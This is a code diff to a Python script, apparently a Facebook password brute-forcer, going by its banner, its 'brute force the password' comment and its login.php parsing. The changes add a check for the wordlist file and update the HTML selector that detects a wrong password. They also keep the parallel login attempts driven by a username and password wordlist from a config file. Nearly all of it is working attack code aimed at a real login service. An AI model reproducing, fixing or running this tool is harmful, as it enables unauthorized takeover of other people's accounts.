@@ -6,6 +6,7 @@ import mechanize
 import time
 import os
 import ConfigParser
+from pathlib import Path
 from multiprocessing import Process
 from bs4 import BeautifulSoup
 from lazyme.string import color_print
@@ -13,7 +14,7 @@ from lazyme.string import color_print
 
 def def_banner():
 
-
+	os.system('clear')
 	color_print(" ______             _                 _    ____             _", color='red')       
  	color_print("|  ____|           | |               | |  |  _ \           | |",color='red')  
  	color_print("| |__ __ _  ___ ___| |__   ___   ___ | | _| |_) |_ __ _   _| |_ ___", color='red')
@@ -36,12 +37,14 @@ def def_config ():
 	global passwords
 	global dic_path
 	dic_path = configParser.get('Config','dict')
-
-	username_empty = configParser.get('Config', 'user')
-	wordlist_empty = configParser.get('Config', 'dict')
-	if username_empty == 'username' and wordlist_empty == 'wordlist':
+	username = configParser.get('Config', 'user')
+	if (Path(dic_path).is_file() == False):
+		color_print("\n\n[!] The wordlist does not extist", color='red')
+		return 1
+	if username == 'username' and dic_path == 'wordlist':
 		color_print("\n\n[!] You need to setup the config file", color='red')
 		return 1
+
 	else:
 		def_parrell(def_login)
 
@@ -83,7 +86,7 @@ def def_login():
 			soup = BeautifulSoup(request, 'html.parser')
 
 			# Attempt to brute force the password.
-			attempt = soup.find_all(action="/login.php?login_attempt=1&lwv=120&lwc=1348092")
+			attempt = soup.find("div",{"class":"fsl fwb fcb"}).text
 			if (len(attempt) > 0):
 				print("[!] Wrong password")
 				browser.select_form(nr = 0)
